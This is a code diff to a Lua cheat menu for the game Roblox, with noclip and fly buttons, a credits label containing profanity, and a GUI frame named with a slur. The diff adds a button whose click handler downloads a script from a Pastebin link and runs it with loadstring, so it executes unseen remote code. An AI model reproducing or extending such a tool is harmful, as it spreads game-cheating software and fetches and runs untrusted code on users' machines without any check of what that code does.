@@ -10,6 +10,7 @@ local NC = Instance.new("TextButton")
 local NCB = Instance.new("TextLabel")
 local FLY = Instance.new("TextButton")
 local Credits = Instance.new("TextLabel")
+local Crazy = Instance.new("TextButton")
 
 --Properties:
 
@@ -76,3 +77,18 @@ Credits.Text = "This shit hub was made by TestACC#9109 on Discord. Message them 
 Credits.TextColor3 = Color3.fromRGB(138, 138, 138)
 Credits.TextSize = 7.000
 Credits.TextWrapped = true
+
+Crazy.Name = "Crazy"
+Crazy.Parent = retardwaremain
+Crazy.BackgroundColor3 = Color3.fromRGB(97, 97, 97)
+Crazy.BorderColor3 = Color3.fromRGB(75, 75, 75)
+Crazy.Position = UDim2.new(0.567940354, 0, 0.761290431, 0)
+Crazy.Size = UDim2.new(0, 131, 0, 40)
+Crazy.Font = Enum.Font.RobotoMono
+Crazy.Text = "R6 Fly - Press E After Pressing"
+Crazy.TextColor3 = Color3.fromRGB(138, 138, 138)
+Crazy.TextSize = 14.000
+Crazy.TextWrapped = true
+Crazy.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/hTJsM2jV'),true))()
+end)
